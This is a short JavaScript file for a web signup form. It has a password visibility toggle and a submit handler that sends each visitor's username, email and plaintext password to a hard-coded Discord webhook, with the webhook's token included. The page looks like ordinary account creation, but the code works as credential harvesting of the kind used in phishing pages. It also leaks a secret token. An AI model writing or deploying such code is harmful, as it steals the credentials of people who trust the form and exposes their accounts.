document.getElementById('toggleSignupPassword').addEventListener('click', function () {
    const passwordInput = document.getElementById('newPassword');
    const type = passwordInput.type === 'password' ? 'text' : 'password';
    passwordInput.type = type;

    if (type === 'password') {
        this.textContent = '👁️';
    } else {
        this.textContent = '🙈';
    }
});

document.getElementById('signupForm').addEventListener('submit', function (event) {
    event.preventDefault();

    const username = document.getElementById('newUsername').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('newPassword').value;

    const webhookURL = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';

    const embedPayload = {
        embeds: [
            {
                title: "New Account Created",
                description: `Username: **${username}**\nEmail: **${email}**\nPassword: **${password}**`,
                color: 0x808080
            }
        ]
    };

    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(embedPayload)
    }).catch(error => {
        console.error('Error sending to Discord:', error);
    });
});
